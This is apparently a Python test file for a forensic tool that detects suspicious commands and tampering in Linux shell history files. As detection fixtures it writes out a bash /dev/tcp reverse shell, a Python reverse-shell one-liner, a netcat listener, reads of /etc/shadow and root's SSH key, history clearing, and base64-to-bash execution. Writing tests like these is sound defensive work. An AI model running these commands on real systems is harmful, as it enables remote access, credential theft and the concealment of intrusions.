"""Tests for linux_shell_history module.

Covers:
- Pure string-level suspicious-pattern detection (unit)
- Parser handles both plain and timestamped history formats (unit)
- Tampering detection (empty history) against scenario 01's root history
- Precision: clean dev/admin histories in both scenarios must NOT surface
  any suspicious entries in normal CI/ops workflow commands.
"""

from pathlib import Path

import pytest

from findevil.tools.linux_shell_history import (
    _SUSPICIOUS_HISTORY_PATTERNS,
    _analyze,
    analyze_entries,
    parse_history,
)

SCENARIO_01_FS = Path(__file__).parent.parent / "samples" / "attack-scenario-01" / "fs"
SCENARIO_02_FS = Path(__file__).parent.parent / "samples" / "attack-scenario-02" / "fs"


# ---------------------------------------------------------------------------
# Parser tests — plain and extended (HISTTIMEFORMAT) formats
# ---------------------------------------------------------------------------


def test_parse_plain_history():
    content = "ls\ncd /tmp\npwd\n"
    entries = parse_history(content)
    assert len(entries) == 3
    assert entries[0].command == "ls"
    assert entries[0].timestamp is None


def test_parse_timestamped_history():
    content = "#1713065234\nls -la\n#1713065240\ncat /etc/passwd\n"
    entries = parse_history(content)
    assert len(entries) == 2
    assert entries[0].command == "ls -la"
    assert entries[0].timestamp is not None
    assert entries[1].command == "cat /etc/passwd"
    assert entries[1].timestamp is not None
    assert entries[0].timestamp < entries[1].timestamp


def test_parse_ignores_blank_lines():
    content = "ls\n\n\ncat foo\n"
    entries = parse_history(content)
    assert len(entries) == 2


# ---------------------------------------------------------------------------
# Suspicious pattern detection — targeted recall
# ---------------------------------------------------------------------------


def _detect(cmd: str) -> list[str]:
    reasons = []
    for pat, label in _SUSPICIOUS_HISTORY_PATTERNS:
        if pat.search(cmd):
            reasons.append(label)
    return reasons


def test_detects_bash_reverse_shell():
    assert "bash reverse shell" in _detect("bash -i >& /dev/tcp/10.1.2.3/4444 0>&1")


def test_detects_nc_bind_shell():
    assert any("reverse/bind" in r for r in _detect("nc -lvnp 4444"))


def test_detects_python_reverse_shell():
    cmd = (
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1.2.3.4\",4444));"
        "os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'"
    )
    assert "python reverse shell one-liner" in _detect(cmd)


def test_detects_shadow_read():
    assert any("credential" in r for r in _detect("cat /etc/shadow"))


def test_detects_ssh_key_read():
    assert any("SSH private key" in r for r in _detect("cat /root/.ssh/id_rsa"))


def test_detects_history_clearing():
    assert any("history clearing" in r for r in _detect("history -c"))
    assert any("truncation" in r for r in _detect("> ~/.bash_history"))


def test_detects_obfuscated_execution():
    assert any("obfuscated" in r for r in _detect("echo xxx | base64 -d | bash"))


def test_detects_tmp_execution():
    assert any("world-writable" in r for r in _detect("bash /tmp/.x"))


def test_ignores_normal_deploy_commands():
    for cmd in [
        "git pull origin main",
        "npm ci",
        "npm run build",
        "systemctl status nginx",
        "git log --oneline -5",
        "docker ps",
    ]:
        assert _detect(cmd) == [], f"should not flag: {cmd}"


# ---------------------------------------------------------------------------
# Tampering detection — empty history = classic `history -c` evidence
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not SCENARIO_01_FS.exists(), reason="scenario 01 FS not present")
def test_scenario01_root_history_flagged_as_empty():
    root_hist = SCENARIO_01_FS / "root" / ".bash_history"
    assert root_hist.exists()
    finding = _analyze(root_hist)
    assert finding.file_size == 0
    assert finding.total_entries == 0
    # Tampering reason should call out the empty file
    assert any("empty" in t.lower() for t in finding.tampering)


# ---------------------------------------------------------------------------
# Precision: clean dev/admin histories stay clean
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not SCENARIO_01_FS.exists(), reason="scenario 01 FS not present")
def test_scenario01_deploy_history_no_suspicious():
    deploy_hist = SCENARIO_01_FS / "home" / "deploy" / ".bash_history"
    finding = _analyze(deploy_hist)
    # The bundled deploy history is a normal CI/ops workflow — nothing should
    # match our suspicious-command heuristics.
    assert finding.suspicious_entries == [], (
        f"false positives: {[(e.command, r) for e, r in finding.suspicious_entries]}"
    )
    assert finding.tampering == [], f"unexpected tampering signal: {finding.tampering}"


@pytest.mark.skipif(not SCENARIO_01_FS.exists(), reason="scenario 01 FS not present")
def test_scenario01_alice_history_no_suspicious():
    alice_hist = SCENARIO_01_FS / "home" / "alice" / ".bash_history"
    finding = _analyze(alice_hist)
    assert finding.suspicious_entries == []


@pytest.mark.skipif(not SCENARIO_02_FS.exists(), reason="scenario 02 FS not present")
def test_scenario02_deploy_history_flags_curl_but_not_tampered():
    """Deploy's history contains `curl -sS https://registry.npmjs.org/` —
    the curl+https pattern matches 'outbound download' by design (high recall).
    The agent must use context to decide it's legitimate. What we verify here
    is that tampering signals are absent and the count of flagged commands
    is small enough to be reviewable."""
    deploy_hist = SCENARIO_02_FS / "home" / "deploy" / ".bash_history"
    finding = _analyze(deploy_hist)
    assert finding.tampering == []
    # At most a small handful of curl/wget lines should be flagged
    assert len(finding.suspicious_entries) <= 3


@pytest.mark.skipif(not SCENARIO_02_FS.exists(), reason="scenario 02 FS not present")
def test_scenario02_root_history_not_tampered():
    """Scenario 02 root has 4 legit lines — no tampering signal expected."""
    root_hist = SCENARIO_02_FS / "root" / ".bash_history"
    finding = _analyze(root_hist)
    assert finding.tampering == []
    assert finding.suspicious_entries == []


# ---------------------------------------------------------------------------
# Suspicious-command end-to-end analyze
# ---------------------------------------------------------------------------


def test_analyze_entries_flags_multiple_reasons(tmp_path: Path):
    """A single command can match multiple categories — all should surface."""
    content = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\ncat /etc/shadow\nhistory -c\n"
    entries = parse_history(content)
    flagged = analyze_entries(entries)
    # All 3 lines should be flagged
    assert len(flagged) == 3
    labels = {r for _, rs in flagged for r in rs}
    assert "bash reverse shell" in labels
    assert any("credential" in l for l in labels)
    assert any("history clearing" in l for l in labels)
